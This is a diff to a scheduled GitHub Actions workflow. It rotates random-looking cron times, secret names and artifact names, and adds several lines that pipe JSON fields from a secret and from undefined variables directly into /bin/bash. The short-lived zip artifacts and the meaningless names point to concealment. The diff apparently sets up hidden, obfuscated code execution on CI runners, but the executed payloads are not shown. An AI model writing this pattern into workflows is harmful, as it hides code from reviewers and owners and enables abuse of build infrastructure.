@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '34 4,10,16,22 * * *'
+    - cron: '13 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -17,16 +17,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run task
         env:
-          uj7: ${{ secrets.uj7 }}
+          fpzgm50: ${{ secrets.fpzgm50 }}
         run: |
-          printf '%s' "$uj7" | jq -r .dgnti609 | /bin/bash
-          printf '%s' "$slpsj409" | jq -r .jmrb0178 | /bin/bash
-          printf '%s' "$zialn447" | jq -r .c0 | /bin/bash
-          printf '%s' "$n04" | jq -r .jbhd18 | /bin/bash
+          printf '%s' "$fpzgm50" | jq -r .nb67867 | /bin/bash
+          printf '%s' "$kt8783" | jq -r .csfk2115 | /bin/bash
+          echo $rh1 | jq -r .pnty6579 | /bin/bash
+          printf '%s' "$sawj2" | jq -r .e511 | /bin/bash
+          echo $umbk1041 | jq -r .tobfr84433 | /bin/bash
+          echo $oaqcu081 | jq -r .ttb2 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
         with:
-          name: rorXF1XC
+          name: lmGx0Vfo
           path: "*.zip"
           retention-days: 1
